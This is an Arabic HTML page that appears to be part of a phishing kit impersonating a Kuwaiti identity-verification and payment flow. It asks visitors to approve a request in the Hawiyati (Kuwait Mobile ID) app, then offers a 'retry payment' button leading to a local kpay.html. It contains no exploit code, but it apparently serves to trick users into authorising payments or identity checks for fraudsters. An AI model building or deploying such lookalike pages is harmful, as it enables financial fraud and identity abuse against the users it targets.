<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الهوية</title>
    <style> 
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            height: 100vh;
            background-color: #f4f4f9;
            margin: 0;
        }

        header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background-color: #154983;
            color: white;
            padding: 15px;
            text-align: center;
            z-index: 10;
        }

        header img {
            max-width: 150px;
        }

        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding-top: 80px; /* لضبط المسافة تحت الهيدر الثابت */
        }

        .check-card {
            background: white;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 350px;
            text-align: center;
        }

        .logo img {
            width: 100%;
            margin-bottom: 20px;
        }

        .check-header h2 {
            font-size: 24px;
            color: #154983;
            margin-bottom: 10px;
        }

        .check-header p {
            font-size: 14px;
            color: #154983;
            margin-bottom: 30px;
        }

        .check-options {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .check-btn {
            background-color: #154983;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 15px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .check-btn:hover {
            background-color: #154983;
        }

        .check-btn:focus {
            outline: none;
        }

        footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #154983;
            color: white;
            padding: 10px;
            text-align: center;
        }

        #hedarr { 
            margin-left: 220px;
        }

    </style>
</head>
<body>

    <header>
        <img id="hedarr"src="KGOLogo11.png" alt="شعار الموقع">
    </header>

    <div class="main-container">
        <div class="check-card">
            <div class="logo">
                <img src="id.jpg" alt="شعار الموقع">
            </div>
            <div class="check-header">
                <h2>  التحقق من الهوية</h2>
                <p> يرجى فتح تطبيق هويتي والموافقة    </p>
            </div>
            <div class="check-options">
                <button class="check-btn" id="botin1">   فتح التطبيق</button>
                <button class="check-btn" id="botin2">  اعادة محاولة الدفع </button>
            </div>
        </div>
    </div>

    <footer>
        <p>حقوق النشر © 2025 جميع الحقوق محفوظة</p>
    </footer>

    <script>
        // إضافة وظائف للتحويل إلى صفحة جديدة عند الضغط على الأزرار
        document.getElementById('botin1').addEventListener('click', () => {
            // التوجيه إلى رابط صفحة بصمة الإصبع
            window.location.href = 'https://apps.apple.com/us/app/kuwait-mobile-id-%D9%87%D9%88%D9%8A%D8%AA%D9%8A/id1449712307?l=ar'; // استبدل الرابط بالعنوان المطلوب
        });

        document.getElementById('botin2').addEventListener('click', () => {
            // التوجيه إلى رابط صفحة التعرف على الوجه
            window.location.href = 'kpay.html'; // استبدل الرابط بالعنوان المطلوب
        });

    </script>

</body>
</html>
